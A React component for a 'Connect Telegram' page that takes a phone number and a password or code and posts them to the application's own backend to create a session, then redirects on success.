import React, { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { useBackendApi } from "../../components/api/axiosBackendApi";
import InputField from "../../components/InputField/InputField";
import "./Password.css";
import "../../style/common.css";

function Password() {
    const location = useLocation();
    const navigate = useNavigate();
    const [phone, setPhone] = useState(location.state?.phone || "");
    const [password, setPassword] = useState("");
    const [showPassword, setShowPassword] = useState(false);
    const [responseMessage, setResponseMessage] = useState("");
    const [errorMessage, setErrorMessage] = useState("");
    const [isLoading, setIsLoading] = useState(false);
    const { apiRequest } = useBackendApi();
    const togglePasswordVisibility = () => {
        setShowPassword(!showPassword);
    };

    const handleConfirm = async () => {
        setIsLoading(true);
        setErrorMessage("");

        if (!phone.trim()) {
            setErrorMessage("Please enter a valid phone number.");
            setIsLoading(false);
            return;
        }

        try {
            const url = "/session/password/";
            const requestBody = {
                phone: phone,
                password_or_code: password,
            };

            const data = await apiRequest(url, {
                method: "POST",
                data: requestBody,
            });

            setResponseMessage("Connection successful: " + JSON.stringify(data));
            navigate("/congratulations");
        } catch (err) {
            setErrorMessage(err.message || "An error occurred");
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="form-container">
            <div className="password-card">
                <h2>Connect Telegram</h2>
                <p>Please enter your phone number and password below</p>

                <InputField
                    type="tel"
                    placeholder="Phone Number"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                />

                <InputField
                    type={showPassword ? "text" : "password"}
                    placeholder="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    showPassword={showPassword}
                    togglePasswordVisibility={togglePasswordVisibility}
                />

                <div className="button-group">
                    <button className="send-btn" onClick={handleConfirm} disabled={isLoading}>
                        {isLoading ? "Processing..." : "Confirm"}
                    </button>
                </div>

                {responseMessage && <p>{responseMessage}</p>}
                {errorMessage && <p style={{ color: "red" }}>{errorMessage}</p>}
            </div>
        </div>
    );
}

export default Password;
